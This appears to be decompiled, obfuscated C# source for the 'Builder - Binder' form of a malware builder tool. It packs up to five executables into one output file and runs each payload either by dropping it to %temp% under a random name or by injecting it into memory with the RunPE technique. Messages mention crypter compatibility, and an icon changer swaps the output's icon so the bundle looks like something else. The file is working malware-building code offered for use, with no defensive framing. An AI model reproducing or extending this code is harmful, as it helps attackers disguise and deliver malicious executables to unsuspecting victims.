﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fBuilderBinder : Form
{
    private IContainer icontainer_0;
    private GClass7 gclass7_0;
    private VisualButton visualButton_0;
    private RadioButton radioButton_0;
    private RadioButton radioButton_1;
    private PictureBox pictureBox_0;
    private PictureBox pictureBox_1;
    private VisualButton visualButton_1;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ToolStripSeparator toolStripSeparator_1;
    private ToolStripMenuItem toolStripMenuItem_2;
    private CheckBox checkBox_0;
    private VisualButton visualButton_2;

    public fBuilderBinder()
    {
        base.Closing += new CancelEventHandler(this.fBuilderBinder_Closing);
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fBuilderBinder_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_3(new VisualButton());
        this.vmethod_5(new RadioButton());
        this.vmethod_7(new RadioButton());
        this.vmethod_13(new VisualButton());
        this.vmethod_15(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_17(new ToolStripMenuItem());
        this.vmethod_19(new ToolStripSeparator());
        this.vmethod_21(new ToolStripMenuItem());
        this.vmethod_23(new ToolStripSeparator());
        this.vmethod_25(new ToolStripMenuItem());
        this.vmethod_27(new CheckBox());
        this.vmethod_9(new PictureBox());
        this.vmethod_11(new PictureBox());
        this.vmethod_1(new GClass7());
        this.vmethod_29(new VisualButton());
        this.vmethod_14().SuspendLayout();
        ((ISupportInitialize) this.vmethod_8()).BeginInit();
        ((ISupportInitialize) this.vmethod_10()).BeginInit();
        base.SuspendLayout();
        this.vmethod_2().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_2().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_2().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_2().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_2().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_2().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_2().Border.HoverVisible = true;
        this.vmethod_2().Border.Rounding = 6;
        this.vmethod_2().Border.Thickness = 1;
        this.vmethod_2().Border.Type = ShapeTypes.Rounded;
        this.vmethod_2().Border.Visible = true;
        this.vmethod_2().DialogResult = DialogResult.None;
        this.vmethod_2().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_2().Image = null;
        this.vmethod_2().Location = new Point(0x163, 12);
        this.vmethod_2().MouseState = MouseStates.Normal;
        this.vmethod_2().Name = "btnAdd";
        this.vmethod_2().Size = new Size(0x3f, 0x13);
        this.vmethod_2().TabIndex = 0x70;
        this.vmethod_2().Text = "Add file";
        this.vmethod_2().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_2().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_2().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_2().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_2().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_2().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_4().AutoSize = true;
        this.vmethod_4().Location = new Point(130, 12);
        this.vmethod_4().Name = "rbMem";
        this.vmethod_4().Size = new Size(0x72, 0x11);
        this.vmethod_4().TabIndex = 0x73;
        this.vmethod_4().Text = "Execute in memory";
        this.vmethod_4().UseVisualStyleBackColor = true;
        this.vmethod_6().AutoSize = true;
        this.vmethod_6().Checked = true;
        this.vmethod_6().Location = new Point(12, 12);
        this.vmethod_6().Name = "rbDisk";
        this.vmethod_6().Size = new Size(90, 0x11);
        this.vmethod_6().TabIndex = 0x72;
        this.vmethod_6().TabStop = true;
        this.vmethod_6().Text = "Run from disk";
        this.vmethod_6().UseVisualStyleBackColor = true;
        this.vmethod_12().Anchor = AnchorStyles.Top;
        this.vmethod_12().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_12().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_12().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_12().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_12().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_12().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_12().Border.HoverVisible = true;
        this.vmethod_12().Border.Rounding = 6;
        this.vmethod_12().Border.Thickness = 1;
        this.vmethod_12().Border.Type = ShapeTypes.Rounded;
        this.vmethod_12().Border.Visible = true;
        this.vmethod_12().DialogResult = DialogResult.None;
        this.vmethod_12().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_12().Image = null;
        this.vmethod_12().Location = new Point(0x225, 8);
        this.vmethod_12().MouseState = MouseStates.Normal;
        this.vmethod_12().Name = "btnBuild";
        this.vmethod_12().Size = new Size(80, 0x1a);
        this.vmethod_12().TabIndex = 0x76;
        this.vmethod_12().Text = "Build";
        this.vmethod_12().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_12().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_12().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_12().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_12().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_12().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_12().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_12().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        ToolStripItem[] toolStripItems = new ToolStripItem[] { this.vmethod_16(), this.vmethod_18(), this.vmethod_20(), this.vmethod_22(), this.vmethod_24() };
        this.vmethod_14().Items.AddRange(toolStripItems);
        this.vmethod_14().Name = "cmsFiles";
        this.vmethod_14().Size = new Size(0xa4, 0x52);
        this.vmethod_16().Name = "AddToolStripMenuItem";
        this.vmethod_16().Size = new Size(0xa3, 0x16);
        this.vmethod_16().Text = "Add";
        this.vmethod_18().Name = "ToolStripMenuItem1";
        this.vmethod_18().Size = new Size(160, 6);
        this.vmethod_20().Name = "RemoveSelectedToolStripMenuItem";
        this.vmethod_20().Size = new Size(0xa3, 0x16);
        this.vmethod_20().Text = "Remove selected";
        this.vmethod_22().Name = "ToolStripMenuItem2";
        this.vmethod_22().Size = new Size(160, 6);
        this.vmethod_24().Name = "ClearToolStripMenuItem";
        this.vmethod_24().Size = new Size(0xa3, 0x16);
        this.vmethod_24().Text = "Clear";
        this.vmethod_26().AutoSize = true;
        this.vmethod_26().BackColor = Color.Transparent;
        this.vmethod_26().Location = new Point(0x116, 14);
        this.vmethod_26().Margin = new Padding(1);
        this.vmethod_26().Name = "chkRunOnce";
        this.vmethod_26().Size = new Size(0x49, 0x11);
        this.vmethod_26().TabIndex = 0x77;
        this.vmethod_26().Text = "Run once";
        this.vmethod_26().UseVisualStyleBackColor = false;
        this.vmethod_8().Image = Class131.smethod_24();
        this.vmethod_8().Location = new Point(0xf4, 14);
        this.vmethod_8().Margin = new Padding(2);
        this.vmethod_8().Name = "pbMem";
        this.vmethod_8().Size = new Size(15, 15);
        this.vmethod_8().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_8().TabIndex = 0x75;
        this.vmethod_8().TabStop = false;
        this.vmethod_10().Image = Class131.smethod_24();
        this.vmethod_10().Location = new Point(0x66, 14);
        this.vmethod_10().Margin = new Padding(2);
        this.vmethod_10().Name = "pbDisk";
        this.vmethod_10().Size = new Size(15, 15);
        this.vmethod_10().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_10().TabIndex = 0x74;
        this.vmethod_10().TabStop = false;
        this.vmethod_0().Alignment = ListViewAlignment.Left;
        this.vmethod_0().Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Top;
        this.vmethod_0().AutoArrange = false;
        this.vmethod_0().BackColor = Color.White;
        this.vmethod_0().ContextMenuStrip = this.vmethod_14();
        this.vmethod_0().Font = new Font("Microsoft Sans Serif", 8.142858f, FontStyle.Regular, GraphicsUnit.Point, 0);
        this.vmethod_0().ForeColor = Color.Black;
        this.vmethod_0().FullRowSelect = true;
        this.vmethod_0().HideSelection = false;
        this.vmethod_0().Location = new Point(1, 0x2a);
        this.vmethod_0().Margin = new Padding(1);
        this.vmethod_0().Name = "lvFiles";
        this.vmethod_0().ShowGroups = false;
        this.vmethod_0().Size = new Size(0x277, 0xc1);
        this.vmethod_0().TabIndex = 110;
        this.vmethod_0().UseCompatibleStateImageBehavior = false;
        this.vmethod_0().View = View.Details;
        this.vmethod_28().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_28().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_28().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_28().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_28().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_28().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_28().Border.HoverVisible = true;
        this.vmethod_28().Border.Rounding = 6;
        this.vmethod_28().Border.Thickness = 1;
        this.vmethod_28().Border.Type = ShapeTypes.Rounded;
        this.vmethod_28().Border.Visible = true;
        this.vmethod_28().DialogResult = DialogResult.None;
        this.vmethod_28().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_28().Image = null;
        this.vmethod_28().Location = new Point(0x1b1, 12);
        this.vmethod_28().MouseState = MouseStates.Normal;
        this.vmethod_28().Name = "btnIconChanger";
        this.vmethod_28().Size = new Size(0x58, 0x13);
        this.vmethod_28().TabIndex = 120;
        this.vmethod_28().Text = "Icon changer";
        this.vmethod_28().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_28().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_28().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_28().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_28().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_28().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_28().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_28().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        base.AutoScaleDimensions = new SizeF(6f, 13f);
        base.AutoScaleMode = AutoScaleMode.Font;
        this.BackColor = SystemColors.AppWorkspace;
        base.ClientSize = new Size(0x279, 0xec);
        base.Controls.Add(this.vmethod_28());
        base.Controls.Add(this.vmethod_26());
        base.Controls.Add(this.vmethod_12());
        base.Controls.Add(this.vmethod_4());
        base.Controls.Add(this.vmethod_6());
        base.Controls.Add(this.vmethod_8());
        base.Controls.Add(this.vmethod_10());
        base.Controls.Add(this.vmethod_2());
        base.Controls.Add(this.vmethod_0());
        this.DoubleBuffered = true;
        base.FormBorderStyle = FormBorderStyle.FixedToolWindow;
        base.MaximizeBox = false;
        base.MinimizeBox = false;
        base.Name = "fBuilderBinder";
        base.Opacity = 0.0;
        base.ShowIcon = false;
        base.ShowInTaskbar = false;
        base.StartPosition = FormStartPosition.CenterScreen;
        this.Text = "Builder - Binder";
        this.vmethod_14().ResumeLayout(false);
        ((ISupportInitialize) this.vmethod_8()).EndInit();
        ((ISupportInitialize) this.vmethod_10()).EndInit();
        base.ResumeLayout(false);
        base.PerformLayout();
    }

    private void method_0(object sender, EventArgs e)
    {
        Interaction.MsgBox("The file will be dropped to Temp directory (%temp%) with a random filename and then executed.", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_1(object sender, EventArgs e)
    {
        Interaction.MsgBox("The file will be executed in memory using classic RunPE method.\r\n\r\nNOTE: This option may not be compatible with all Crypters. \r\nMake sure to test it!", MsgBoxStyle.Information, Application.ProductName);
    }

    private void method_10(object sender, EventArgs e)
    {
        OpenFileDialog dialog = new OpenFileDialog();
        dialog.Multiselect = false;
        dialog.InitialDirectory = Application.StartupPath;
        dialog.Title = "Select executable (.exe) file";
        dialog.Filter = "Exe Files (*.exe*)|*.exe";
        dialog.FilterIndex = 1;
        if (dialog.ShowDialog() != DialogResult.OK)
        {
            Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            byte[] bytes = File.ReadAllBytes(dialog.FileName);
            if (Operators.CompareString(Encoding.UTF8.GetString(bytes).Substring(0, 2), "MZ", true) != 0)
            {
                Interaction.MsgBox("Not a valid PE/Executable file!", MsgBoxStyle.Critical, Application.ProductName);
            }
            OpenFileDialog dialog2 = new OpenFileDialog();
            dialog2.Multiselect = false;
            dialog2.InitialDirectory = Application.StartupPath;
            dialog2.Title = "Select icon (.ico) file";
            dialog2.Filter = "Exe Files (*.ico*)|*.ico";
            dialog2.FilterIndex = 1;
            if (dialog2.ShowDialog() != DialogResult.OK)
            {
                Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else if (smethod_0(dialog.FileName, dialog2.FileName))
            {
                Interaction.MsgBox("Icon successfully changed!\r\n\r\nNOTE: You may have to restart Explorer (explorer.exe) to see the changes in the icon.", MsgBoxStyle.Information, Application.ProductName);
            }
            else
            {
                Interaction.MsgBox("Icon changer failed!", MsgBoxStyle.Critical, Application.ProductName);
            }
        }
    }

    public void method_2()
    {
        if (this.vmethod_0().Columns.Count == 0)
        {
            this.vmethod_0().Columns.Add("File", "File");
            this.vmethod_0().Columns.Add("Size", "Size");
            this.vmethod_0().Columns.Add("Path", "Path");
            this.vmethod_0().Columns.Add("Execution", "Execution");
            this.vmethod_0().Columns.Add("Run once", "Run once");
            this.vmethod_0().Columns[0].Width = 120;
            this.vmethod_0().Columns[1].Width = 80;
            this.vmethod_0().Columns[2].Width = 220;
            this.vmethod_0().Columns[3].Width = 120;
            this.vmethod_0().Columns[4].Width = 80;
        }
        this.vmethod_0().GridLines = Class135.smethod_0().Gridlines;
        base.Opacity = 100.0;
    }

    private void method_3(object sender, EventArgs e)
    {
        this.method_4();
    }

    private void method_4()
    {
        if (this.vmethod_0().Items.Count >= 5)
        {
            Interaction.MsgBox("Maximum 5 files are allowed!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            OpenFileDialog dialog = new OpenFileDialog();
            dialog.Multiselect = false;
            dialog.InitialDirectory = Application.StartupPath;
            dialog.Title = "Select a 32-bit Executable (.exe) file";
            dialog.Filter = "Exe Files (*.exe*)|*.exe";
            dialog.FilterIndex = 1;
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                byte[] bytes = File.ReadAllBytes(dialog.FileName);
                string str = Encoding.UTF8.GetString(bytes);
                if (Operators.CompareString(str.Substring(0, 2), "MZ", true) != 0)
                {
                    Interaction.MsgBox("Not a valid PE/Executable file!", MsgBoxStyle.Critical, Application.ProductName);
                }
                if (this.vmethod_4().Checked & Class136.smethod_54(dialog.FileName))
                {
                    Interaction.MsgBox("Executable is not 32-bit!\r\nA 32-bit executable is required for execution in memory.", MsgBoxStyle.Critical, Application.ProductName);
                }
                else if (-this.vmethod_4().Checked & Strings.InStr(str.ToLower(), "mscoree.dll", CompareMethod.Text))
                {
                    Interaction.MsgBox("Not a native executable file!\r\nA native executable is required for execution in memory.", MsgBoxStyle.Critical, Application.ProductName);
                }
                else
                {
                    OpenFileDialog dialog2;
                    int num3;
                    ListViewItem item = new ListViewItem();
                    item.Text = Path.GetFileName(dialog.FileName);
                    item.Tag = dialog.FileName;
                    string fileName = (dialog2 = dialog).FileName;
                    dialog2.FileName = fileName;
                    ref bool flagRef = ref false;
                    double number = Class136.smethod_32(ref fileName);
                    ListViewItem.ListViewSubItemCollection subItems = item.SubItems;
                    ProjectData.ClearProjectError();
                    string expression = string.Empty;
                    if (number >= 1099511627776)
                    {
                        expression = Strings.Format((((number / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
                    }
                    else if (number >= 1073741824.0)
                    {
                        expression = Strings.Format(((number / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
                    }
                    else if (number >= 1048576.0)
                    {
                        expression = Strings.Format((number / 1024.0) / 1024.0, "#0.00") + " MiB";
                    }
                    else if (number >= 1024.0)
                    {
                        expression = Strings.Format(number / 1024.0, "#0.00") + " KiB";
                    }
                    else if (number < 1024.0)
                    {
                        expression = Conversions.ToString(Conversion.Fix(number)) + " B";
                    }
                    if (flagRef)
                    {
                        expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
                    }
                    string text = (expression.Length <= 0) ? " 0 B" : expression;
                    if (num3 != 0)
                    {
                        ProjectData.ClearProjectError();
                    }
                    subItems.Add(text);
                    item.SubItems.Add(dialog.FileName);
                    object[] arguments = new object[] { Interaction.IIf(this.vmethod_4().Checked, "Memory", "Disk") };
                    NewLateBinding.LateCall(item.SubItems, null, "Add", arguments, null, null, null, true);
                    object[] objArray2 = new object[] { Interaction.IIf(this.vmethod_26().Checked, "Yes", "No") };
                    NewLateBinding.LateCall(item.SubItems, null, "Add", objArray2, null, null, null, true);
                    this.vmethod_0().Items.Add(item);
                }
            }
        }
    }

    private void method_5(object sender, EventArgs e)
    {
        this.vmethod_12().Enabled = false;
        this.vmethod_0().Enabled = false;
        this.vmethod_2().Enabled = false;
        this.vmethod_4().Enabled = false;
        this.vmethod_6().Enabled = false;
        if (this.vmethod_0().Items.Count == 0)
        {
            Interaction.MsgBox("No files added! Please, add at least one file.", MsgBoxStyle.Critical, Application.ProductName);
            this.vmethod_12().Enabled = true;
            this.vmethod_0().Enabled = true;
            this.vmethod_2().Enabled = true;
            this.vmethod_4().Enabled = true;
            this.vmethod_6().Enabled = true;
        }
        else
        {
            string left = Conversions.ToString(this.vmethod_0().Items.Count) + "|";
            IEnumerator enumerator = this.vmethod_0().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ListViewItem current = (ListViewItem) enumerator.Current;
                left = Conversions.ToString(Operators.ConcatenateObject(left, Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Interaction.IIf(Operators.CompareString(current.SubItems[3].Text, "Memory", true) == 0, "1", "0"), "-"), Interaction.IIf(Operators.CompareString(current.SubItems[4].Text, "Yes", true) == 0, Class136.smethod_38(8L), "0")), "|")));
            }
            left = left.Substring(0, left.Length - 1);
            byte[] destinationArray = Class131.smethod_7();
            byte[] bytes = Encoding.UTF8.GetBytes(Class136.smethod_40(left));
            byte[] buffer3 = new byte[0x80];
            Array.Copy(bytes, 0, buffer3, 0, bytes.Length);
            Array.Copy(buffer3, 0, destinationArray, 0x33060, buffer3.Length);
            SaveFileDialog dialog = new SaveFileDialog();
            dialog.Filter = "Executable |*.exe";
            if (dialog.ShowDialog() != DialogResult.OK)
            {
                Interaction.MsgBox("Operation cancelled!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                Class136.Class142 class2 = new Class136.Class142();
                class2.string_0 = dialog.FileName;
                class2.byte_0 = destinationArray;
                class2.bool_0 = false;
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                IEnumerator enumerator2 = this.vmethod_0().Items.GetEnumerator();
                while (true)
                {
                    int num;
                    if (!enumerator2.MoveNext())
                    {
                        Interaction.MsgBox("File successfully saved to: " + dialog.FileName, MsgBoxStyle.Information, Application.ProductName);
                        break;
                    }
                    ListViewItem current = (ListViewItem) enumerator2.Current;
                    num++;
                    UnicodeEncoding encoding1 = new UnicodeEncoding();
                    switch (num)
                    {
                        case 1:
                        {
                            Class136.smethod_55(dialog.FileName, Conversions.ToString(0x65), File.ReadAllBytes(Conversions.ToString(current.Tag)));
                            continue;
                        }
                        case 2:
                        {
                            Class136.smethod_55(dialog.FileName, Conversions.ToString(0x66), File.ReadAllBytes(Conversions.ToString(current.Tag)));
                            continue;
                        }
                        case 3:
                        {
                            Class136.smethod_55(dialog.FileName, Conversions.ToString(0x67), File.ReadAllBytes(Conversions.ToString(current.Tag)));
                            continue;
                        }
                        case 4:
                        {
                            Class136.smethod_55(dialog.FileName, Conversions.ToString(0x68), File.ReadAllBytes(Conversions.ToString(current.Tag)));
                            continue;
                        }
                        case 5:
                        {
                            Class136.smethod_55(dialog.FileName, Conversions.ToString(0x69), File.ReadAllBytes(Conversions.ToString(current.Tag)));
                            continue;
                        }
                    }
                }
            }
            this.vmethod_12().Enabled = true;
            this.vmethod_0().Enabled = true;
            this.vmethod_2().Enabled = true;
            this.vmethod_4().Enabled = true;
            this.vmethod_6().Enabled = true;
        }
    }

    private void method_6(object sender, EventArgs e)
    {
        this.method_4();
    }

    private void method_7(object sender, EventArgs e)
    {
        this.vmethod_0().Items.Clear();
    }

    private void method_8(object sender, EventArgs e)
    {
        while (true)
        {
            IEnumerator enumerator = this.vmethod_0().Items.GetEnumerator();
            while (true)
            {
                if (!enumerator.MoveNext())
                {
                    return;
                }
                ListViewItem current = (ListViewItem) enumerator.Current;
                if (current.Selected)
                {
                    this.vmethod_0().Items.Remove(current);
                    break;
                }
            }
        }
    }

    private void method_9(object sender, MouseEventArgs e)
    {
        this.vmethod_20().Enabled = this.vmethod_0().Items.Count > 0;
        this.vmethod_24().Enabled = this.vmethod_0().Items.Count > 0;
    }

    public static bool smethod_0(string string_0, string string_1)
    {
        return smethod_1(string_0, string_1, 1, 1);
    }

    public static bool smethod_1(string string_0, string string_1, uint uint_0, uint uint_1)
    {
        bool flag;
        Class133 class2 = Class133.smethod_0(string_1);
        IntPtr ptr = Class134.BeginUpdateResource(string_0, false);
        byte[] buffer = class2.method_2(uint_1);
        if (!Class134.UpdateResource(ptr, new IntPtr(14L), new IntPtr((long) uint_0), 0, buffer, buffer.Length))
        {
            flag = false;
        }
        else
        {
            int num2 = class2.method_0() - 1;
            int num = 0;
            while (true)
            {
                if (num > num2)
                {
                    Class134.EndUpdateResource(ptr, false);
                    flag = true;
                }
                else
                {
                    byte[] buffer2 = class2.method_1(num);
                    if (Class134.UpdateResource(ptr, new IntPtr(3L), new IntPtr(uint_1 + num), 0, buffer2, buffer2.Length))
                    {
                        num++;
                        continue;
                    }
                    flag = false;
                }
                break;
            }
        }
        return flag;
    }

    internal virtual GClass7 vmethod_0()
    {
        return this.gclass7_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(GClass7 gclass7_1)
    {
        MouseEventHandler handler = new MouseEventHandler(this.method_9);
        GClass7 class2 = this.gclass7_0;
        if (class2 != null)
        {
            class2.MouseUp -= handler;
        }
        this.gclass7_0 = gclass7_1;
        class2 = this.gclass7_0;
        if (class2 != null)
        {
            class2.MouseUp += handler;
        }
    }

    internal virtual PictureBox vmethod_10()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_0);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_1 = pictureBox_2;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual VisualButton vmethod_12()
    {
        return this.visualButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(VisualButton visualButton_3)
    {
        EventHandler handler = new EventHandler(this.method_5);
        VisualButton button = this.visualButton_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_1 = visualButton_3;
        button = this.visualButton_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ContextMenuStrip vmethod_14()
    {
        return this.contextMenuStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(ContextMenuStrip contextMenuStrip_1)
    {
        this.contextMenuStrip_0 = contextMenuStrip_1;
    }

    internal virtual ToolStripMenuItem vmethod_16()
    {
        return this.toolStripMenuItem_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(ToolStripMenuItem toolStripMenuItem_3)
    {
        EventHandler handler = new EventHandler(this.method_6);
        ToolStripMenuItem item = this.toolStripMenuItem_0;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_0 = toolStripMenuItem_3;
        item = this.toolStripMenuItem_0;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_18()
    {
        return this.toolStripSeparator_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(ToolStripSeparator toolStripSeparator_2)
    {
        this.toolStripSeparator_0 = toolStripSeparator_2;
    }

    internal virtual VisualButton vmethod_2()
    {
        return this.visualButton_0;
    }

    internal virtual ToolStripMenuItem vmethod_20()
    {
        return this.toolStripMenuItem_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(ToolStripMenuItem toolStripMenuItem_3)
    {
        EventHandler handler = new EventHandler(this.method_8);
        ToolStripMenuItem item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_1 = toolStripMenuItem_3;
        item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_22()
    {
        return this.toolStripSeparator_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(ToolStripSeparator toolStripSeparator_2)
    {
        this.toolStripSeparator_1 = toolStripSeparator_2;
    }

    internal virtual ToolStripMenuItem vmethod_24()
    {
        return this.toolStripMenuItem_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(ToolStripMenuItem toolStripMenuItem_3)
    {
        EventHandler handler = new EventHandler(this.method_7);
        ToolStripMenuItem item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_2 = toolStripMenuItem_3;
        item = this.toolStripMenuItem_2;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual CheckBox vmethod_26()
    {
        return this.checkBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(CheckBox checkBox_1)
    {
        this.checkBox_0 = checkBox_1;
    }

    internal virtual VisualButton vmethod_28()
    {
        return this.visualButton_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(VisualButton visualButton_3)
    {
        EventHandler handler = new EventHandler(this.method_10);
        VisualButton button = this.visualButton_2;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_2 = visualButton_3;
        button = this.visualButton_2;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(VisualButton visualButton_3)
    {
        EventHandler handler = new EventHandler(this.method_3);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_3;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual RadioButton vmethod_4()
    {
        return this.radioButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(RadioButton radioButton_2)
    {
        this.radioButton_0 = radioButton_2;
    }

    internal virtual RadioButton vmethod_6()
    {
        return this.radioButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(RadioButton radioButton_2)
    {
        this.radioButton_1 = radioButton_2;
    }

    internal virtual PictureBox vmethod_8()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(PictureBox pictureBox_2)
    {
        EventHandler handler = new EventHandler(this.method_1);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_2;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    private sealed class Class133
    {
        private fBuilderBinder.Struct26 struct26_0 = new fBuilderBinder.Struct26();
        private fBuilderBinder.Struct23[] struct23_0;
        private byte[][] byte_0;

        private Class133()
        {
        }

        public int method_0()
        {
            return this.struct26_0.ushort_2;
        }

        public byte[] method_1(int int_0)
        {
            return this.byte_0[int_0];
        }

        public byte[] method_2(uint uint_0)
        {
            byte[] buffer = new byte[((Marshal.SizeOf(typeof(fBuilderBinder.Struct26)) + (Marshal.SizeOf(typeof(fBuilderBinder.Struct25)) * this.method_0())) - 1) + 1];
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            Marshal.StructureToPtr<fBuilderBinder.Struct26>(this.struct26_0, handle.AddrOfPinnedObject(), false);
